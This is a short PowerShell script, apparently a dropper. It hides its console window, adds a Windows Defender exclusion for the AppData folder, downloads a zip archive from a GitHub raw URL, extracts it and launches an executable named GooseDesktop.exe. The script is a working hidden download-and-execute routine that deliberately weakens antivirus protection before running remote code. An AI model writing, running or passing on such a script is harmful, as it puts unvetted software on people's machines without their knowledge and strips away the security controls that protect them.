$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) 
#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\goose"
Set-Location "$env:appdata\goose"
Invoke-WebRequest -Uri "https://github.com/isppilslowispp/Aslclripysa/raw/main/sab.zip" -OutFile "$env:appdata\goose\sab.zip"
cd $env:appdata\goose
Expand-Archive sab.zip
cd $env:appdata\goose\sab\sab
./GooseDesktop.exe



